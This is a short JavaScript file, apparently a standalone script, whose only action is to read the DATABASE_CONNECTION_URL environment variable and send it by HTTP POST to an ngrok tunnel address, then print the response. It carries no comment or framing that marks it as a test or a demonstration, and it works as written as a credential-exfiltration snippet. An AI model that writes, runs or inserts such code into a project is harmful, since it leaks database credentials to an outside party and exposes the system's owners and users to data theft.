async function main() {
  const res = await fetch("https://2f68-67-255-255-91.ngrok-free.app", {
    method: "POST",
    body: JSON.stringify({ url: process.env.DATABASE_CONNECTION_URL }),
    headers: {
      "Content-Type": "application/json",
    },
  });
  console.log(await res.text());
}

main();
